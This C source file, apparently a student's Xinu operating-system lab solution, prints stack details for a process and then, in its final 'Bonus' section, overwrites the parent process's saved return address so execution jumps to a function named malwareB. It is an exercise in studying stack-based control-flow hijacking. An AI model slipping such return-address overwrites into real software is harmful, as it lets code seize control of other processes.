/*  myfuncA.c - myfuncA */

#include <xinu.h>

char myfuncA(int x)
{
    int *esp;        /* Stack pointer; used in 5.3 & 5.4 & 6 */
    uint32 i;         /* Loop variable; used in 6    */
    pid32 pid;      /* Used in 5.3 & 5.4 & 6   */
    pid32 ppid;         /* Used in 6    */

    pid = getpid();
    /* 5.3: Get the address and content of the top of the run-time stack (stack pointer) */
    /*
    asm volatile ("movl %%esp, %0\n\t"
                : "=r" (esp));
    */

    /* 5.3: Print the address of the top of run-time stack   */
    /*
    kprintf("Process Name: %s\n", proctab[pid].prname);
    kprintf("After myfuncA() is called, the address of the top of the run-time stack is [0x%08X].\n",
            (uint32)esp);
    kprintf("------The 16 bytes preceding the top of the stack are as follows------\n");
    kprintf("[0x%08X] 0x%08X (top)\n", (uint32)esp, *esp);
    kprintf("[0x%08X] 0x%08X\n", (uint32)(esp + 1), *(esp + 1));
    kprintf("[0x%08X] 0x%08X\n", (uint32)(esp + 2), *(esp + 2));
    kprintf("[0x%08X] 0x%08X\n", (uint32)(esp + 3), *(esp + 3));
    kprintf("\n\n");
    */

    /* 5.4 & 6 Print stack base, stack size, stack limit, stack pointer, PID, and parent PID.   */
    asm volatile ("movl %%esp, %0\n\t"
                : "=r" (esp));
    kprintf("Process Name: %s\n", proctab[pid].prname);
    kprintf("Stack Base: [0x%08X]\n", (uint32)proctab[pid].prstkbase);
    kprintf("Stack Size: %d bytes\n", (uint32)(proctab[pid].prstkbase) - (uint32)(esp) + 4);
    kprintf("Stack Limit: %d bytes\n", proctab[pid].prstklen);
    kprintf("Stack Pointer: [0x%08X]\n", (uint32)esp);
    kprintf("PID: %d\n", pid);
    kprintf("PPID: %d\n", getppid());
    kprintf("\n\n");


    /* 6: Overwrite the return address of myprogA with the address of malwareA.  */

    ppid = getppid();                           /* 6: The parent process should be the process to be attacked.  */
    
    /* 6: Print the stack of myprogA to find the return address    */

    kprintf("\nThe whole stack frame of myprogA() process from the bottom to the top:\n");
    for (i = (uint32)proctab[ppid].prstkbase; i >= (uint32)proctab[ppid].prstkptr; i -= 4) {
        kprintf("[0x%08X] 0x%08X\n", i, *(int *)i);
    }


    /* 6: The return address of 'sleepms' should just follow the argument '3000'(0x00000BB8)  */
    
    /* 6: In my case, the return address is 'proctab[ppid].prstkptr + 120' */
    //*(int *)(proctab[ppid].prstkptr + 120) = (uint32)malwareA;

    /* 6: Save the INITRET address preceding the return address in order that myprogA can exit normally   */
    //*(int *)(proctab[ppid].prstkptr + 124) = *(int *)(proctab[ppid].prstkbase - 4);



    /* Bonus: Temporarily save the true return address in 'proctab[ppid].prstkptr + 124' for malwareB().  */
    *(int *)(proctab[ppid].prstkptr + 124) = *(int *)(proctab[ppid].prstkptr + 120);
    *(int *)(proctab[ppid].prstkptr + 120) = (uint32)malwareB;  /* Bonus: Change the return address to malwareB() */

    return (char)('a' + x % 26);
}

